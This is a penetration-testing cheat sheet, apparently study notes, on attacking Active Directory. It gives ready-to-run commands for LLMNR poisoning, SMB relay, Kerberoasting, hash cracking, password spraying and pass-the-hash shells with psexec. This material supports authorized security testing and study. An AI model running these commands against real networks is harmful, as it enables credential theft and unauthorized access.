# Active Directory Attacks & Exploitation

## LLMNR Poisoning
Start with mitm6 and responder
1. Scan to generate traffic
2. Check for default credentials
3. Enumerate AD environment

Responder LLMNR Capture:
```
sudo responder -I <adapter> -dPv
```

Target Hash Cracking:
```
hashcat -m 5500 <hash.txt> <wordlist>
```

## SMB Relay Attacks
Detect vulnerable targets:
```
nmap --script=smb2-security-mode.nse -p 445 <target>
```
Look for: Message signing enabled but not required

Disable SMB/HTTP in responder config:
```
sudo vim /etc/responder/Responder.conf
```

Run responder:
```
sudo responder -I <interface> -dP
```

Set up SMB relay:
```
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

## Kerberoasting
Extract SPNs:
```
impacket-GetUserSPNs <DOMAIN/user:pass> -dc-ip <ip> -request
```

Crack Kerberos hashes:
```
hashcat -m 13100 <hash.txt> <wordlist.txt>
```

## BloodHound Enumeration
Start Neo4j:
```
sudo neo4j console
```

Start BloodHound:
```
sudo bloodhound
```

Ingest data:
```
sudo bloodhound-python -d <domain> -u <user> -p <pass> -ns <IP> -c all
```

## Credential Attacks
Password policy enum:
```
crackmapexec smb <DC-IP> -u <user> -p <pass> --pass-pol
```

User enumeration (Kerbrute):
```
kerbrute userenum -d <Domain> --dc <DC-IP> users.txt
```

Password spraying:
```
crackmapexec smb <DC-IP> -u users.txt -p Password123 | grep +
```

## Shell Access
With password:
```
impacket-psexec <domain>/<user>:'<pass>'@<DC-IP>
```

With hash:
```
impacket-psexec <user>@<DC-IP> -hashes <LM>:<NT>
```
